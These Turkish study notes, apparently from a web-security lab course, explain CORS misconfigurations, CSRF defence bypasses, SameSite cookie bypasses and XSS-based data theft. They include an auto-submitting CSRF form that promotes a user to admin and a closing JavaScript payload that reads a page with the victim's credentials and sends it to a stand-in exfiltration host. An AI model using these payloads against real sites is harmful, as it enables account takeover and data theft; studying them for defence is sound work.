Access-Control-Allow-Origin header'ı, Same-Origin politikasını atlamasına izin verilen origin'i içerir ve böylece tarayıcı orijinin yanıta erişmesine izin verir. Ek olarak, başlık bir joker karaktere ( * ) ayarlanabilir, bu da tüm orijinlere Same-Origin ilkesinin atlanmasına izin verilmesiyle sonuçlanır. Ancak, güvenlik nedenleriyle, bu Access-Control-Allow-Credentials: true başlığı ile birleştirilemez, yani joker karakter yalnızca kimlik bilgileri olmadan kullanılabilir.

Not: http://*.vulnerablesite.htb gibi bir kaynak ve joker karakter kombinasyonu geçersizdir.

Ancak, bazı web uygulamalarının birden fazla kaynak için kimlik bilgilerine izin vermesi gerekir. Örneğin, http://api.vulnerablesite.htb adresinde çalışan bir API'nin kimlik doğrulaması gerektirdiği ve http://site1.vulnerablesite.htb ve http://site2.vulnerablesite.htb gibi birden fazla domain tarafından kullanıldığı bir senaryo düşünün. Bunu uygulamak için, bir web uygulaması isteğin Origin başlığını okuyabilir ve bunu yanıttaki Access-Control-Allow-Origin başlığında yansıtabilir. Bu, Access-Control-AllowCredentials: true başlığıyla birlikte joker origin ile  aynı senaryoyu etkili bir şekilde sonuçlandırır, ancak CORS standardı tarafından açıkça engellenmez.

Rastgele orijinleri yansıtan bir CORS yanlış yapılandırmasını belirlemek için, web uygulamasının Access-Control-Allow-Origin header'ını Origin header'ında alınan değere ayarladığı örnekleri aramamız gerekir. Daha sonra ilgili isteği Burp Repeater'a gönderebilir ve Origin başlığını thisdoesnotexist.whatever.htb gibi sahte bir değerle değiştirebilir ve bu domainin AccessControl-Allow-Origin yanıt başlığında bulunup bulunmadığını kontrol edebiliriz. Eğer öyleyse, web uygulaması bu CORS yanlış yapılandırmasından muzdariptir.


### Exploitation

Bu durumdan faydalanmak için bir saldırgan, web sunucusunda aşağıdakine benzer bir payload'u keyfi bir kaynakla, örneğin http://exploitserver.htb/exploit adresinde barındırabilir:

![Pasted image 20241216221712.png](/img/user/resimler/Pasted%20image%2020241216221712.png)

Tarayıcı http://api.vulnerablesite.htb adresinde yanlış yapılandırılmış API için geçerli kimlik bilgilerini saklarken kurbanın http://exploitserver.htb/exploit adresindeki payload'a gittiğini varsayalım. Bu durumda, verilere kurbanın geçerli oturumundan erişilir ve güvensiz CORS yapılandırması nedeniyle saldırgana aktarılır.

Payload'u barındıran siteye eriştikten sonra, kurbanın tarayıcısı http://api.vulnerablesite.htb/data adresine kimlik bilgileri, yani session cookie'leri ile cross-origin request gönderir:

![Pasted image 20241216221951.png](/img/user/resimler/Pasted%20image%2020241216221951.png)

Response, CORS başlığındaki orijini yansıttığından ve kimlik bilgilerine izin verdiğinden, saldırganın orijini http://exploitserver.htb'a Same-Origin politikasının bir istisnası verilir. Bu nedenle, payload kodunun yanıta erişmesine izin verilir ve bunu exfiltration sunucusuna göndererek exfiltrate eder:

![Pasted image 20241216222710.png](/img/user/resimler/Pasted%20image%2020241216222710.png)

Dolayısıyla, bu CORS yanlış yapılandırması, geçerli kimlik bilgilerine sahip olmayan bir saldırganın, kimlik doğrulama ile korunuyor olsa bile API'den veri okumasına olanak tanır.


### Uygun Olmayan Origin Whitelist

Bir web uygulaması rastgele origin'leri yansıtmak yerine, bir origin'i yansıtmadan önce güvenilir origin'lerden oluşan bir whitelist'e karşı kontrol etmelidir. Bu kontrol yanlış yapılırsa, bir saldırgan bunu atlayabilir ve güvenilmeyen bir kaynak için Same-Origin exception elde edebilir. Özellikle, bir kaynağın önekini veya sonekini kontrol eden uygulamalar savunmasız olabilir.

Bir web uygulamasının yaygın bir hedefi, belirli bir kaynağın tüm subdomain'lerine güvenmektir. Örneğin, http://api.vulnerablesite.htb adresinde barındırılan bir API'nin, yalnızca kardeş subdomain'lere Same-Origin policy exception verildiğini doğrulamak için vulnerablesite.htb string'i ile bitip bitmediğini kontrol ederek gelen orijin header'larını doğruladığını varsayalım. API, güvenmeden önce orijin için bir kontrol uygularken, kontrol yalnızca vulnerablesite.htb'nin subdomain'lerini değil, vulnerablesite.htb ile biten tüm domain'leri kapsadığı için yanlış uygulanmıştır.


### Exploitation

Bu CORS yanlış yapılandırmasını istismar etmek, saldırgan verileri dışarı sızdırmak için aynı payload'u kullanabileceğinden, keyfi origin yansımasını istismar etmekle aynıdır. Bununla birlikte, origin kontrol edildiğinden, saldırganın payload'u barındırabileceği origin üzerinde sınırlamalar vardır. Postfix eşleşmesi nedeniyle, bir saldırgan istismar için http://exploitserver.htb kaynağını kullanamaz, ancak payload'u barındırmak için http://attackervulnerablesite.htb gibi vulnerablesite.htb ile biten herhangi bir kaynağı seçebilir.


### Trusted null origin

Access-Control-Allow-Origin header'ı yalnızca güvenilir bir kaynağı ve bir joker karakteri değil, aynı zamanda null kaynağını gösteren null değerini de destekler. Bunun pratikte kullanılmaması gerekirken, bazı web uygulamaları anlamının yanlış anlaşılması nedeniyle bunu uygulayabilir. Bir saldırgan, daha sonra güvenilen bir cross-origin request üzerinde null origin'i zorlamak için çeşitli yöntemler kullanabilir ve bu da Same-Origin policy istisnasına neden olur.

Bu yanlış yapılandırmayı tespit etmek için null kaynağına açıkça güvenilen örnekleri belirlemeliyiz. Bunu başarmak için Access-ControlAllow-Origin CORS başlığında null değerini arayabiliriz.


### Exploitation

Bir saldırganın bu yanlış yapılandırmadan yararlanmak için cross origin isteğinde null origin sağlaması gerekir. Herhangi bir kaynak, sandbox'lı bir iframe kullanarak bunu başarabilir:

![Pasted image 20241216224826.png](/img/user/resimler/Pasted%20image%2020241216224826.png)

Bu payload kullanıldığında, exploit önceki yanlış yapılandırmalarla aynıdır. Ancak, sandbox'lı iframe, cross origin isteğinde null origin ile sonuçlanır:

![Pasted image 20241216225133.png](/img/user/resimler/Pasted%20image%2020241216225133.png)


### Lokal ağın hedeflenmesi

Web uygulaması CORS'u kimlik bilgilerine izin verecek şekilde yapılandırmasa bile, bir saldırgan bir güvenlik duvarı, reverse proxy veya NAT arkasında lokal bir ağda çalışan ve public erişime açık olmayan web uygulamalarını hedef alabilir. Bu iç web uygulamaları kimlik doğrulaması gerektirmiyorsa ve saldırganın kaynağına güvenen bir CORS yanlış yapılandırması içeriyorsa veri sızıntısı mümkün olabilir.

Kimlik doğrulama gerekmiyorsa, Access-Control-Allow-Credentials CORS başlığı da gerekli değildir. Bu nedenle, şimdiye kadar tartışılan CORS yanlış yapılandırmalarına ek olarak, joker karakter kaynağı da bu durumlarda istismar edilebilir bir yanlış yapılandırmaya neden olur. Örneğin, kimlik doğrulama gerektirmeyen iç API'nin http://172.16.0.2 adresinde barındırıldığını varsayalım. Ek olarak, API Access-Control-Allow-Origin'de bir joker karakter belirler ve böylece tüm kaynaklara güvenir.


### Exploitation

API'nin tek koruması, yalnızca dahili ağdan erişilebilir olmasıdır; ancak, wildcard origin (joker kaynak) nedeniyle saldırgan kontrolündeki herhangi bir kaynağın, bir kurban API'ye erişebiliyorsa verileri dışarı sızdırmasına olanak tanır. Herhangi bir kimlik doğrulama gerekmediği için, payload içinde **withCredentials** seçeneğini ayarlamamız gerekmez.

![Pasted image 20241216231242.png](/img/user/resimler/Pasted%20image%2020241216231242.png)

Payload'u açan kurbanın iç API ile aynı iç ağda olduğunu ve dolayısıyla ona erişebileceğini varsayalım. Bu durumda, kurbanın tarayıcısı iç ağ içinde cross-origin isteği yapar:

![Pasted image 20241216231347.png](/img/user/resimler/Pasted%20image%2020241216231347.png)

Response daha sonra saldırgana sızdırılır ve public olarak erişilemeyen web uygulamalarından veri sızdırılmasını sağlar

Dahası, saldırganın yanlış yapılandırılmış uygulamanın çalıştığı IP adresini ve portu bilmesine gerek yoktur, ancak uygulama bulunana kadar farklı IP adresleri ve port kombinasyonları talep etmeye çalışarak iç ağı taramak için payload'u geliştirebilir.

**Hedef aldığımız web uygulamasına göre payload'larımızı geliştirebilir ve ince ayar yapabiliriz.** Örneğin, tüm sayfayı bir GET parametresinde göndermek genelde iyi bir uygulama değildir, çünkü URL uzunluğu sınırsız değildir. Sayfa çok büyükse payload başarısız olabilir. Bunun yerine, bir POST parametresi kullanmak daha iyidir. Alternatif olarak, veriyi bölerek birden fazla istekte gönderebilir ya da yanıtı ayrıştırıp yalnızca ilgi çekici öğeleri dışarı çıkararak URL'nin çok uzun olmamasını sağlayabiliriz. Bu, `getElementById` gibi fonksiyonlar kullanılarak elemanları arayarak gerçekleştirilebilir.

![Pasted image 20241216233738.png](/img/user/resimler/Pasted%20image%2020241216233738.png)
![Pasted image 20241216233743.png](/img/user/resimler/Pasted%20image%2020241216233743.png)

Not: Laboratuvarda, web tarayıcınızın üçüncü taraf cookies ile ilgili ayarları exploit kodunuzun düzgün çalışmasını engelleyebilir. Ancak, exploit kurbana iletilirken bu sorunlar ortaya çıkmayacaktır. JavaScript konsolunda üçüncü taraf çerezleriyle ilgili hatalara dikkat ettiğinizden ve tarayıcı ayarlarını buna göre yaptığınızdan emin olun.


### CORS Yanlış Yapılandırmaları ile CSRF Tokenlarını Atlama

Önceki bölümlerde tartışılan saldırı vektörlerine ek olarak, CORS yanlış yapılandırmaları CSRF savunmalarını atlamak ve uygun savunmalar uygulansa bile CSRF saldırıları gerçekleştirmek için de kullanılabilir.

CORS, session cookie'lerin cross-origin request'lerle birlikte gönderileceği şekilde yanlış yapılandırılırsa, yani Access-Control-Allow-Credentials ayarlanırsa, SameOrigin politikasını etkili bir şekilde atlayabiliriz. Bu durumda, bu bölümde tartışacağımız gibi, yaygın CSRF savunmaları etkisizdir.



### Defense Bypass: CSRF Tokens

Bir CORS yanlış yapılandırması nedeniyle Same-Origin politikasını atlayabilirsek, yaptığımız cross orijinli request'lerin response'larına erişebiliriz. Bu, geçerli bir CSRF tokenı oluşturan endpoint'e cross-origin isteği yapmamıza, onu okumamıza, durum değiştiren cross-origin isteğimizin içine gömmemize ve geçerli CSRF tokenı ile state-changing cross-origin isteğini göndermemize olanak sağlar. Tüm bunlar kurbanın oturumunda gerçekleştiğinden, CSRF token'ı düzgün bir şekilde kontrol edilse ve kurbanın kullanıcı oturumuna bağlansa bile geçerlidir.

Ancak, kurbanın tarayıcısının kurbanın session cookie'sini JavaScript'ten yapılan request'lerle birlikte göndermesi için, savunmasız web uygulamasının CORS yanlış yapılandırmasına ek olarak SameSite cookie özniteliğini açıkça None olarak ayarlamasını gerektiriyoruz. Spesifikasyona göre, buna yalnızca cookie iletimine yalnızca güvenli HTTPS bağlantıları üzerinden izin veren Secure cookie özniteliği ile izin verilir. Cookie, şifrelenmemiş HTTP bağlantıları boyunca gönderilmeyecektir.

Bu kısıtlama nedeniyle, örnek web uygulamasına ve diğer tüm laboratuvar bileşenlerine yalnızca HTTPS kullanılarak erişilebilir. Web uygulamasını analiz edersek, web uygulamasının Access-Control-Allow-Origin ve Access-Control-AllowCredentials CORS başlıklarını ayarladığını fark edebiliriz, bu da bir CORS yanlış yapılandırması olup olmadığını kontrol etmemiz gerektiğini gösterir. Ayrıca, session cookie hem Secure hem de SameSite=None cookie nitelikleriyle ayarlanmıştır:

![Pasted image 20241216235006.png](/img/user/resimler/Pasted%20image%2020241216235006.png)

HTTP Origin başlığına farklı değerler girersek web uygulamasının davranışını analiz edebiliriz. Eğer rastgele bir değer girersek, web uygulamasının gerçekten de yanlış yapılandırıldığını görebiliriz, çünkü rastgele orijinler Access-Control-Allow-Origin CORS başlığına yansıtılır:

![Pasted image 20241216235042.png](/img/user/resimler/Pasted%20image%2020241216235042.png)

Uygun CSRF korumasını atlamak ve bir CSRF saldırısı gerçekleştirmek için SameSite=None cookie özniteliği ile bu CORS yanlış yapılandırmasından yararlanabiliriz. Bu saldırının potansiyel hedeflerini belirlemek için web uygulamasını daha fazla analiz edelim.

Daha önce olduğu gibi, web uygulaması kullanıcı hesaplarını adminlere yükseltme fonksiyonu uygular. Bu kez, ilgili POST isteği bir CSRF tokenı tarafından uygun şekilde korunmaktadır:

![Pasted image 20241216235201.png](/img/user/resimler/Pasted%20image%2020241216235201.png)

Kurbanın oturumunda geçerli bir CSRF token'ı elde etmek için bir exploit yazalım ve daha sonra kurbanın kullanıcı hesabımızı administrator ayrıcalıklarına sahip olacak şekilde yükseltmesini sağlamak için ilgili cross-origin isteğini yapalım. CSRF tokenı /profile.php endpoint'ine yapılan bir GET isteğine yanıt olarak gönderilir. Aşağıdakine benzer bir JavaScript kodu kullanarak ilgili isteği yapabilir, yanıtı ayrıştırabilir ve CSRF token'ını çıkarabiliriz:

![Pasted image 20241216235251.png](/img/user/resimler/Pasted%20image%2020241216235251.png)

Daha sonra, kullanıcımızı geçerli CSRF tokeni ile tanıtmak için cross-origin request oluşturabiliriz:

![Pasted image 20241216235327.png](/img/user/resimler/Pasted%20image%2020241216235327.png)

Her iki parçayı birleştirerek exploit sunucumuzda aşağıdaki payload'u elde edebiliriz:

![Pasted image 20241216235349.png](/img/user/resimler/Pasted%20image%2020241216235349.png)

İstismarımızı görüntüleyecek olursak, /profile.php adresine kimliği doğrulanmış bir GET isteği ve ardından geçerli CSRF token ile /profile.php adresine kimliği doğrulanmış bir POST isteği olduğunu görebiliriz. Bu nedenle, istismarımız çalışmalıdır. Kurbana ilettikten ve birkaç saniye bekledikten sonra, kullanıcımız yöneticiye yükseltilir. Böylece, CSRF korumasını atlamak ve başarılı bir CSRF saldırısı gerçekleştirmek için CORS yanlış yapılandırmasından başarıyla yararlandık:

![Pasted image 20241216235445.png](/img/user/resimler/Pasted%20image%2020241216235445.png)


# Misc CSRF Exploitation

Son birkaç bölümde CORS yanlış yapılandırmalarını tartıştıktan sonra, zayıf CSRF savunmalarını atlamak için kullanılabilecek farklı çeşitli CSRF saldırı vektörlerini inceleyeceğiz.


### SameSite Cookie'leri Atlamak için Saldırı Vektörlerini Birleştirme

Web tarayıcıları, isteğin kaynak sitesine ve amaçlanan hedefe bağlı olarak isteklerle birlikte SameSite cookie'lerinin gönderilip gönderilmeyeceğine karar verir. Bu, birkaç bölüm önce görüldüğü gibi, Same-Origin politikası için dikkate alınan kaynaktan farklıdır. Temel fark, port ve subdomain'in sitenin bir parçası olarak kabul edilmemesidir. Bu nedenle, port ve alt domain farklı olsa bile iki domain aynı site olarak kabul edilir ve bazı durumlarda cross-origin bir istek yine de SameSite olarak kabul edilir. Aşağıdaki örnekleri göz önünde bulundurun:

- **[http://vulnerable.htb](http://vulnerable.htb)** ve **[http://sub.vulnerable.htb](http://sub.vulnerable.htb)** **SameSite**'tir.
- **[http://vulnerable.htb](http://vulnerable.htb)** ve **[http://vulnerable.htb:9001](http://vulnerable.htb:9001)** **SameSite**'tir.
- **[http://vulnerable.htb](http://vulnerable.htb)** ve **[http://sub.vulnerable.htb:9001](http://sub.vulnerable.htb:9001)** **SameSite**'tir.
- **[http://vulnerable.htb](http://vulnerable.htb)** ve **[https://vulnerable.htb](https://vulnerable.htb)** **SameSite** **değildir**.
- **[http://vulnerable.htb](http://vulnerable.htb)** ve **[http://exploitserver.htb](http://exploitserver.htb)** **SameSite** **değildir**.

SameSite cookie'lerinin getirdiği kısıtlamaları aşmak için bu davranışı kullanabileceğimiz birkaç yol vardır. Örneğin, session cookie'nin SameSite özelliği Lax olarak ayarlandığında, yalnızca GET istekleri gibi güvenli isteklerle gönderilir. Web uygulaması durum değiştiren ve GET istekleri ile yapılan herhangi bir endpoint içeriyorsa, SameSite koruması etkisizdir. Aynı durum, tüm durum değiştirme işlemleri POST isteklerini kullanıyorsa, ancak web uygulaması yanlış yapılandırılmışsa ve GET isteklerini kabul ediyorsa da geçerlidir.

Strict SameSite kısıtlamalarını atlamamız gerekiyorsa, yukarıda tartışılan yanlış yapılandırmayı hedef sitede istemci tarafı yönlendirmesi ile birleştirebiliriz. Kurbanı istemci tarafı yeniden yönlendirme endpoint'ine gönderen bir payload yazarsak, client tarafı yeniden yönlendirme hedef site tarafından başlatılır ve bu nedenle SameSite olarak kabul edilir. Bu nedenle, SameSite özniteliği Strict olarak ayarlanmış olsa bile, kurbanın cookie'leri sonuçta ortaya çıkan istekle birlikte gönderilir. Kurbanı, durum değiştirme işlemleri için GET isteklerini kabul eden yanlış yapılandırılmış endpoint'e yönlendirirsek, başarılı bir CSRF saldırısı gerçekleştirebiliriz.

Not: Bu bypass yalnızca client taraflı yönlendirmelerde çalışır, HTTP 3xx durum kodları gibi server taraflı yönlendirmelerde çalışmaz.

Örnek olarak, session cookie üzerinde SameSite cookie özniteliğini Strict olarak ayarlayan aşağıdaki web uygulamasını ele alalım:

![Pasted image 20241217000645.png](/img/user/resimler/Pasted%20image%2020241217000645.png)

İlginç bir şekilde, web uygulaması başarılı bir girişten sonra bizi geçici bir sayfaya yönlendiriyor ve bu sayfa da bizi profilimize yönlendiriyor:

![Pasted image 20241217000932.png](/img/user/resimler/Pasted%20image%2020241217000932.png)

Kaynak koduna baktığımızda, ortaya çıkan yönlendirmenin client tarafı yönlendirmesi olan bir HTML meta etiketi kullanılarak uygulandığını görebiliriz:

![Pasted image 20241217001009.png](/img/user/resimler/Pasted%20image%2020241217001009.png)

Ayrıca, web uygulaması bu parametreyi yeniden yönlendirme URL'sinde kopyalıyor gibi göründüğünden, kullanıcı GET parametresi aracılığıyla URL'ye ek GET parametreleri enjekte edebiliriz:

![Pasted image 20241217001042.png](/img/user/resimler/Pasted%20image%2020241217001042.png)

Kullanıcı profili, birkaç bölüm önce tartışılan CSRF güvenlik açığına karşı savunmasızdır ve kullanıcımızı /profile.php?promote=htb-stdnt endpoint'i aracılığıyla yükseltmemizi sağlar. Ancak, SameSite özniteliği Strict olarak ayarlandığından, önceki payload'umuz çalışmayacaktır. Bunun yerine, başarılı bir CSRF exploit'i oluşturmak için client-side redirect'ten faydalanabiliriz. Bunu başarmak için, kurbanın endpoint'e eriştiğinden emin olmalıyız, bu da client-side redirect ile sonuçlanır. Ayrıca, kullanıcımızı yönetici ayrıcalıklarına yükseltmek için kurbanın promote=htb-stdnt GET parametresini içeren bir URL'ye yönlendirilmesi gerekir. Bunu aşağıdakine benzer bir payload ile başarabiliriz:


![Pasted image 20241217001245.png](/img/user/resimler/Pasted%20image%2020241217001245.png)

Bu payload'u exploit sunucusunda exploit'imiz olarak ayarlamak ve kurbana iletmek CSRF saldırısını başarıyla yürütür. Daha sonra, web uygulamasında yönetici ayrıcalıkları elde ederiz.

Son olarak, subdomain'ler SameSite olarak kabul edildiğinden, bunlardaki XSS açıklarından yararlanarak SameSite cookie kısıtlamalarını atlayabiliriz. Bu durumda, cross-origin isteği SameSite olarak kabul edilir. Bu nedenle, kurbanın cookie'leri istekle birlikte gönderilir ve başarılı bir CSRF saldırısı ile sonuçlanır. Bu senaryoyu ilerleyen bölümlerde daha ayrıntılı olarak inceleyeceğiz.

Örnek web uygulamamıza baktığımızda, session cookie üzerinde SameSite=Strict özniteliğini ayarlayarak cookie'nin herhangi bir cross-site isteği ile birlikte gönderilmesini engellediğini görebiliriz:

![Pasted image 20241217001438.png](/img/user/resimler/Pasted%20image%2020241217001438.png)

Ancak, yukarıda tartıştığımız gibi, subdomainler aynı site olarak kabul edilir. Bu nedenle, XSS'ye karşı potansiyel olarak savunmasız olan subdomainleri belirlemeye çalışalım. Bunu gobuster kullanarak yapabiliriz:

![Pasted image 20241217001529.png](/img/user/resimler/Pasted%20image%2020241217001529.png)

http://guestbook.vulnerablesite.htb subdomain'ine baktığımızda, birkaç bölüm önce gördüğümüz ziyaretçi defteri web uygulamasını tespit edebiliriz. Aynı XSS açığının hala mevcut olduğunu doğrulayabiliriz:

![Pasted image 20241217001611.png](/img/user/resimler/Pasted%20image%2020241217001611.png)

Ziyaretçi defteri girişlerini izleyen yöneticinin http://vulnerablesite.htb adresindeki ana uygulamada da oturum açtığını varsayarsak, SameSite kısıtlamasını atlamak ve yöneticinin kullanıcımızı yönetici konumuna yükseltmesini sağlamak için bu XSS açığını kötüye kullanabiliriz. Bunu yapmak için, yönetici kullanıcıyı ilgili POST isteğini göndermeye zorlamamız gerekir; bunu da aşağıdaki XSS payload'u ile başarabiliriz:

![Pasted image 20241217001651.png](/img/user/resimler/Pasted%20image%2020241217001651.png)

Payload'umuzu ziyaretçi defterine gönderdikten ve yönetici kullanıcının sayfaya erişmesi için birkaç saniye bekledikten sonra, CSRF saldırısının başarılı olduğunu ve kullanıcımızın terfi ettiğini görebiliriz:

![Pasted image 20241217001729.png](/img/user/resimler/Pasted%20image%2020241217001729.png)


## Weak Token Brute-Force

Session Security modülünde kısaca tartışıldığı gibi, başarılı bir CSRF saldırısı gerçekleştirmek için zayıf CSRF token'ları bypass edilebilir. CSRF token'ı bir kullanıcı oturumuna bağlı olmadığında basit bypasslar meydana gelebilir. Bu durumda, savunmasız web uygulamasına erişen bir saldırgan, kendi oturumundan gelen cross orijin isteğine geçerli bir CSRF token'ı ekleyebilir. Bu durumda backend, CSRF token'ı geçerli olduğu için kurbanın oturumundan gelen cross-origin isteğini kabul edecektir. Bir başka örnek de CSRF token'larının tamamen rastgele olmadığı ve tahmin edilebilir olduğu durumlardır. CSRF token'ının nasıl oluşturulduğuna bağlı olarak (kullanıcı adı ya da geçerli zaman damgasının bir hash'i gibi), tek bir denemede tahmin edebilir ya da bir payload kullanarak brute-force yapabiliriz.

Bu kez, web uygulaması CSRF token'ları ile korunmuştur, böylece düz bir CSRF saldırısı artık başarılı olmayacaktır. Bununla birlikte, birden fazla CSRF token'ı elde edersek, bunun artan bir sayı olduğunu, potansiyel olarak bir sayaç gibi bir şey olduğunu ve bu nedenle muhtemelen brute zorla zorlanabileceğini anlayabiliriz:

![Pasted image 20241217001928.png](/img/user/resimler/Pasted%20image%2020241217001928.png)

CSRF token'larını daha yakından analiz edersek, CSRF token'ının Unix Timestamp olarak basitçe geçerli zaman olduğunu fark edebiliriz. Bu, CSRF token'ını tahmin edilebilir hale getirir ve CSRF saldırısını başarıyla gerçekleştirmek için çalışan bir exploit oluşturmamıza olanak tanır. Bunu yapmak için, kurbanın CSRF token'ını, yani kurbanın payload'umuza erişmeden önce /profile.php endpoint'ine en son ne zaman eriştiğini doğru bir şekilde tahmin etmeliyiz. Zamanlamayı tam olarak doğru yapmak zordur çünkü varsayılan SameSite Lax politikasının getirdiği kısıtlamalar nedeniyle JavaScript kodunu kullanarak CSRF token'ını dinamik olarak brute-force edemeyiz. Bu nedenle, tahmin edilen CSRF token'ını HTML formumuzda sabit kodlamamız ve her tahmin için değeri güncellememiz gerekir:

![Pasted image 20241217002103.png](/img/user/resimler/Pasted%20image%2020241217002103.png)

Bu, CSRF token'ını kaba kuvvetle zorlamayı daha zor hale getirse ve dolayısıyla başarılı bir saldırı olasılığını azaltsa da, geçerli bir CSRF token'ını tahmin etmek ve zayıf korumayı atlamak mümkündür.


### Header Tabanlı Savunma Önlemlerinin Atlatılması

Header tabanlı CSRF koruma önlemleri yanlış uygulanırsa, diğer domain adı veya URL filtrelerine benzer şekilde bunları atlatabiliriz. Örneğin, savunmasız web uygulaması http://vulnerablesite.htb yalnızca Referer başlığında vulnerablesite.htb string'inin varlığını kontrol ediyorsa, payload'u http://exploitserver.htb/somepath/vulnerablesite.htb gibi bu string'i içeren bir URL'de barındırabiliriz. Benzer şekilde, Referer başlığının ilgili string ile bitip bitmediğini kontrol eden filtreleri de atlayabiliriz.


## CSRF with JSON Request Body

Birçok modern web uygulaması POST isteğindeki verilerin JSON olmasını bekler. Bu durumda, CSRF saldırılarını yalnızca belirli koşullar altında gerçekleştirebiliriz çünkü CSRF payload'u ile JSON formatlı POST parametreleri değil, yalnızca URL kodlu POST parametreleri gönderebiliriz. Ancak, yalnızca JSON verilerini kabul eden bir web uygulaması yine de CSRF'ye karşı savunmasız olabilir.

İlk olarak, web uygulamasının Content-Type başlığını belirtmemize izin veren bir CORS yanlış yapılandırmasından muzdarip olduğunu varsayalım. Bu durumda, başlığı basitçe application/json olarak ayarlayabilir ve JavaScript kodundan bir JSON body gönderebiliriz. Ancak bu, ek CORS yanlış yapılandırmasının mevcut olmasını gerektirir.

Alternatif olarak, web uygulaması istekte gönderilen Content-Type başlığını doğru bir şekilde kontrol etmezse CSRF'ye karşı savunmasız olabilir. HTML tabanlı bir CSRF payload'u yalnızca HTML formundaki enctype niteliğini kullanarak ayarlayabileceğimiz application/x-www-form-urlencoded, text/plain ve multipart/form-data Content-Type başlıklarını destekler. Böylece web uygulaması Content-Type başlığını kontrol ederek request body'nin beklenen JSON formatında olmadığını belirleyebilir ve böylece CSRF isteğini potansiyel olarak reddedebilir. Ancak, web uygulaması Content-Type başlığını düzgün bir şekilde kontrol etmez ve yalnızca request body'nin syntax'ına güvenirse, aşağıdakine benzer bir CSRF payload'u ile bir JSON body'si taklit edebiliriz:

```html
<html>
  <body>
    <form method="POST" action="http://csrf.vulnerablesite.htb/profile.php" enctype="text/plain">
      <input type="hidden" name='{"promote": "htb-stdnt", "dummykey' value='": "dummyvalue"}' />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```


Bu CSRF payload'u aşağıdaki istekle sonuçlanır:

```http
POST /profile.php HTTP/1.1
Host: csrf.vulnerablesite.htb
Content-Length: 53
Content-Type: text/plain

{"promote": "htb-stdnt", "dummykey=": "dummyvalue"}
```

Content-Type başlığının yukarıda tartışıldığı gibi application/json olmadığını görebiliriz. Ancak, request body geçerli bir JSON'dur ve bu nedenle web uygulaması tarafından ayrıştırılabilir. JSON'a sahte bir anahtar ve sahte bir değer ekledik çünkü HMTL payload teknik olarak Content-Type text/plain ile bir request body gönderir ve böylece parametrenin adı ve değeri arasına bir = ekler. Sahte anahtar ve sahte değer ekleyerek, = işaretinin sahte anahtara eklenmesini ve payload verilerimizi kirletmemesini sağlayabiliriz. Bu yöntem, web uygulamasının yalnızca JSON kodlu bir request body kabul ettiği durumlarda bile CSRF saldırıları gerçekleştirmemizi sağlar.



### Introduction to XSS Exploitation

HTTP istekleri yapmak, yanıtlarını almak ve kontrolümüz altındaki bir sunucuya veri sızdırmak için cross-site scripting (XSS) exploitleri kullanabiliriz. Bu nedenle, cross-origin isteklerde bulunan XSS payload'ları yazabilir ve XSS ile CSRF payload'larını birleştirerek kurbanın tüm iç ağı için tehdit oluşturan bir exploit tekniği elde edebiliriz.

Buna ek olarak, web tarayıcılarının, SameSite özniteliği açıkça ayarlanmamışsa cookie için genellikle SameSite Lax politikasını uyguladığı gerçeği, CSRF istismarı yeteneğini önemli ölçüde kısıtlamaktadır. Bu nedenle, XSS ve CSRF'nin birleştirilmesi güçlü bir istismar tekniği olduğunu kanıtlamaktadır.


## HTTPOnly Cookie Flag

Hedef kişilerin session cookie'lerini çalmak, tehdit aktörlerinin XSS açıklarını kullanarak gerçekleştirdikleri en yaygın istismar tekniğidir; ancak bu teknik, session cookie üzerinde HttpOnly özniteliği kullanılarak engellenebilir. Bu özellik, JavaScript kodundan cookie'ye erişimi engeller. Daha spesifik olarak, document.cookie dosyasına erişirsek, HTTPOnly özniteliği ayarlanmış cookie'ler mevcut olmayacaktır. Bu, kurbanın session cookie'sinin dışarı sızmasını etkili bir şekilde önler. Bununla birlikte, XSS güvenlik açıklarının ciddiyetini azaltması gerekmez. Bir XSS, kurbanın tarayıcısında, savunmasız web uygulaması içinde ve hedef bağlamında keyfi JavaScript kodu çalıştırmamıza izin verdiğinden, session cookie'yi biliyormuşuz gibi aynı eylemleri gerçekleştirebiliriz. Ancak, tarayıcımızda kurbanın session cookie'sini ayarladıktan sonra ilgili eylemleri manuel olarak yapmak yerine bizim için yapması için bir XSS payload'u yazmamız gerekir.


##  XSS ile Veri Sızdırma

Bir XSS saldırısının payload'u kurbanın tarayıcısında ve kullanıcı context'inde çalıştırıldığından, saldırganın kurbanın bakış açısından herhangi bir veriye erişmesini sağlar. Bu nedenle, düşük ayrıcalıklı bir saldırgan, kurbanın yönetici ayrıcalıklarına sahip olması durumunda, savunmasız web uygulamasına yönetici erişimi elde etmek için bir XSS güvenlik açığını kullanabilir. Bunu, web uygulamasından rastgele veri sızdırmak için kötüye kullanabiliriz.

Kurbanın context'indeki bilgilere erişmek ve exfiltration sunucumuza bilgi sızdırmak için, HTTP istekleri göndermemizi ve yanıtlarla etkileşime girmemizi sağlayan bir [XMLHttpRequest](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest) nesnesi kullanabiliriz.

Örnek web uygulamamız daha önce gördüğümüz ziyaretçi defteri uygulamasının aynısıdır. Aynı XSS güvenlik açığı hala mevcut. Ancak, bu sefer session cookie HTTPOnly bayrağına sahip olduğundan onu çalmamızı engelliyor:

![Pasted image 20241217105538.png](/img/user/resimler/Pasted%20image%2020241217105538.png)


Kurbanın bir yönetici olduğunu varsayarsak, web uygulaması içindeki herhangi bir fonksiyonun yalnızca yöneticiler tarafından görülebilir olup olmadığını belirlemek için web uygulamasını onların bakış açısından listelemeliyiz. Bunu yapmak için, kurbanın context'inden zaten bildiğimiz endpoint'lere erişelim ve yanıtı exfiltration sunucumuza exfiltrate edelim. Bunu başarmak için, aşağıdaki XSS payload'unu içeren bir ziyaretçi defteri girişi yapabiliriz:

```html
<script src=""http://exploitserver.htb/exploit"></script>
```

Daha sonra, XSS payload'unu yazmak için exploitserver'ı kullanabiliriz. Biz /home.php endpoint'ine erişen ve base64 kodlu yanıtı exfiltration sunucusuna exfiltrate eden basit bir payload kullanacağız:

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', '/home.php', false);
xhr.withCredentials = true;
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

